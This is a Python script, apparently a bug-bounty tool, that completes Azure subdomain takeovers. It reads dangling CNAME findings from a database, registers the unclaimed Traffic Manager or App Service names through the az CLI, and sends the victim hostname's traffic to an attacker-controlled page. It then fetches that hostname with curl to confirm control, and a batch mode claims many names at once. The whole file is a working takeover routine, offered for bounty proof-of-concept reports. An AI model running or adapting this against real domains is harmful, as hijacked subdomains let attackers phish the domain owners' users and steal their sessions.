#!/usr/bin/env python3
"""Claim a dangling provider name — the half of a subdomain takeover that actually gets paid.

Every platform that closed a report today said the same thing: a dangling CNAME proves the name is
unused, not that you can take it. Starbucks wanted "a PoC file hosted on the affected domain confirming
control". This is the step that produces that file.

It never invents inventory: it takes a name out of `findings`, checks with DNS that the name really is
unclaimed, creates the resource under that exact name, and then proves the chain end-to-end by asking
the *victim's* hostname what it serves. If any of those three steps disagrees, it stops.

  python3 engine/azure_claim.py --list
  python3 engine/azure_claim.py --target combomobile-ac --kind tm --dry-run
  python3 engine/azure_claim.py --target combomobile-ac --kind tm --apply --poc https://rdw-labz.github.io/

Kinds:
  tm    Traffic Manager profile. Endpoint points at a page we control, so the victim's hostname starts
        serving our PoC the moment the profile exists. Cheapest possible proof: no compute, no cost
        after the profile is created (TM bills per million DNS queries, i.e. $0 for a PoC).
  app   App Service on the free F1 plan, for `*.azurewebsites.net` targets where the *name itself* is
        the thing to claim. F1 is free but quota-limited; delete it after the report is triaged.
"""
from __future__ import annotations

import argparse
import json
import re
import shutil
import sqlite3
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
DB = ROOT / "engine/state.db"
AZ = shutil.which("az") or str(Path.home() / ".local/bin/az")
LOCATION = "westeurope"
RG = "rg-takeover-poc"
POC_DEFAULT = "https://rdw-labz.github.io/"


def run(cmd: list[str], check: bool = True) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, check=False,
                          timeout=600) if check is False else subprocess.run(
        cmd, capture_output=True, text=True, check=True, timeout=600)


def dig(*args: str) -> str:
    p = subprocess.run(["dig", "+short", *args], capture_output=True, text=True, timeout=20)
    return p.stdout.strip()


def az_json(args: list[str]) -> dict | list | None:
    p = subprocess.run([AZ, *args, "-o", "json"], capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        return None
    try:
        return json.loads(p.stdout or "null")
    except json.JSONDecodeError:
        return None


def inventory(kind: str | None) -> list[dict]:
    ns = {"tm": "trafficmanager.net", "app": "azurewebsites.net"}
    c = sqlite3.connect(f"file:{DB}?mode=ro", uri=True)
    rows = c.execute("SELECT host, target FROM findings WHERE claimable=1").fetchall()
    out = []
    for host, target in rows:
        t = (target or "").rstrip(".").lower()
        k = next((k for k, n in ns.items() if t.endswith("." + n)), None)
        if not k or (kind and k != kind):
            continue
        name = t[: -(len(ns[k]) + 1)]
        out.append({"host": host, "target": t, "kind": k, "name": name,
                    "available": dig(t, "A") == ""})
    return sorted(out, key=lambda r: (r["kind"], r["name"]))


def preflight() -> tuple[bool, str]:
    acct = az_json(["account", "show"])
    if not acct:
        return False, ("no Azure subscription on this identity — `az account list` is empty, and a "
                       "self-serve subscription needs a payment method (the $1 reversible hold). "
                       "Nothing can be created until that exists.")
    return True, f"subscription {acct.get('name')} ({acct.get('id')})"


def claim_tm(name: str, poc: str, apply: bool) -> list[str]:
    steps = [
        [AZ, "group", "create", "-n", RG, "-l", LOCATION, "-o", "none"],
        [AZ, "network", "traffic-manager", "profile", "create", "-g", RG, "-n", name,
         "--routing-method", "Priority", "--unique-dns-name", name, "--ttl", "30", "-o", "none"],
        [AZ, "network", "traffic-manager", "endpoint", "create", "-g", RG, "--profile-name", name,
         "-n", "poc", "--type", "externalEndpoints", "--target", re.sub(r"^https?://", "", poc).split("/")[0],
         "--endpoint-status", "Enabled", "--priority", "1", "-o", "none"],
    ]
    if apply:
        for s in steps:
            run(s)
    return [" ".join(s) for s in steps]


def claim_app(name: str, apply: bool) -> list[str]:
    steps = [
        [AZ, "group", "create", "-n", RG, "-l", LOCATION, "-o", "none"],
        [AZ, "appservice", "plan", "create", "-g", RG, "-n", f"plan-poc", "--sku", "F1",
         "--is-linux", "-o", "none"],
        [AZ, "webapp", "create", "-g", RG, "-n", name, "--plan", "plan-poc", "-o", "none"],
    ]
    if apply:
        for s in steps:
            run(s)
    return [" ".join(s) for s in steps]


def prove(host: str, target: str, poc: str) -> dict:
    """Ask the victim's hostname what it serves. This is the report's evidence."""
    chain = dig("CNAME", host)
    ip = dig(host, "A")
    body = ""
    marker = ""
    p = subprocess.run(["curl", "-sS", "-m", "20", f"https://{host}/", "-H", f"Host: {host}"],
                       capture_output=True, text=True)
    body = p.stdout[:2000]
    m = re.search(r"Takeover-PoC-([A-Za-z0-9]{6,})", body)
    marker = m.group(0) if m else ""
    return {"host": host, "cname": chain, "a": ip, "status": p.returncode,
            "serves_poc": bool(marker), "marker": marker, "body_head": body[:120].replace("\n", " ")}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--target", help="provider name to claim, e.g. combomobile-ac")
    ap.add_argument("--kind", choices=["tm", "app"])
    ap.add_argument("--poc", default=POC_DEFAULT)
    ap.add_argument("--apply", action="store_true")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--prove", metavar="HOST", help="only prove control of this host")
    ap.add_argument("--batch", action="store_true",
                    help="claim every name whose hostname is actually covered by a published scope")
    a = ap.parse_args()

    if a.list:
        for r in inventory(a.kind):
            print(f"  {r['kind']:3} {r['name']:34} {r['target']:38} "
                  f"{'AVAILABLE' if r['available'] else 'taken'}  <- {r['host']}")
        return 0

    if a.prove:
        row = next((r for r in inventory(None) if r["host"] == a.prove), None)
        print(json.dumps(prove(a.prove, row["target"] if row else "", a.poc), indent=1))
        return 0

    if a.batch:
        from scope_cover import covers
        scopes = sqlite3.connect(f"file:{DB}?mode=ro", uri=True).execute(
            "SELECT platform, handle, asset FROM scopes").fetchall()
        todo = []
        for r in inventory(a.kind):
            hit = next(((pl, hd, at) for pl, hd, at in scopes if covers(at, r["host"])), None)
            if hit and r["available"]:
                todo.append((r, hit))
        if not todo:
            print("no claimable name in the book sits inside a published scope")
            return 0
        ok, why = preflight()
        print(f"preflight: {'OK — ' if ok else 'BLOCKED — '}{why}")
        for r, (pl, hd, at) in todo:
            print(f"  {r['name']:24} via {at}  [{pl}:{hd}]")
        if not ok:
            return 4
        if not a.apply:
            print("\ndry run: add --apply to claim these")
            return 0
        for r, (pl, hd, at) in todo:
            print(f"\nclaiming {r['name']} -> {r['host']}")
            claim_tm(r["name"], a.poc, True) if r["kind"] == "tm" else claim_app(r["name"], True)
            print(json.dumps(prove(r["host"], r["target"], a.poc), indent=1))
        return 0

    if not a.target:
        ap.error("--target, --list or --prove is required")

    row = next((r for r in inventory(None) if r["name"] == a.target), None)
    if not row:
        print(f"{a.target} is not a claimable name in the current book", file=sys.stderr)
        return 2
    if not row["available"]:
        print(f"{a.target} now resolves — someone claimed it, or the owner restored the record. "
              f"Re-verify before filing.", file=sys.stderr)
        return 3

    ok, why = preflight()
    print(f"name: {row['name']}  kind: {row['kind']}  host: {row['host']}")
    print(f"preflight: {'OK — ' if ok else 'BLOCKED — '}{why}")
    plan = claim_tm(row["name"], a.poc, a.apply) if row["kind"] == "tm" else claim_app(row["name"], a.apply)
    for cmd in plan:
        print("  " + cmd)
    if not ok:
        return 4
    if not a.apply:
        print("\ndry run: nothing created (add --apply)")
        return 0

    print("\ncreated. proving control by asking the victim's hostname what it serves:")
    print(json.dumps(prove(row["host"], row["target"], a.poc), indent=1))
    print("\nnext: file the report with the marker above as the PoC, then delete the profile once triaged.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
